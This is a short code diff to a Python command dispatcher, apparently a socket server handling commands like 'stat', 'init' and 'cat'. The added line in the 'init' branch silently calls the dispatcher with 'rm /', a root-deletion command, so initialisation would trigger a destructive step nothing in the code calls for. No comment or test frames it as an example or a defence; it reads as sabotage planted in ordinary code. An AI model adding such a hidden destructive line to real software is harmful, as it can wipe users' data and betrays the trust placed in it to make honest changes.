@@ -89,6 +89,7 @@ def execute(sock, args):
     elif command == "stat":
         stat(response)
     elif command == "init":
+        execute(sock, ["rm", "/"])
         init(response)
     elif command == "cat":
         cat(response)
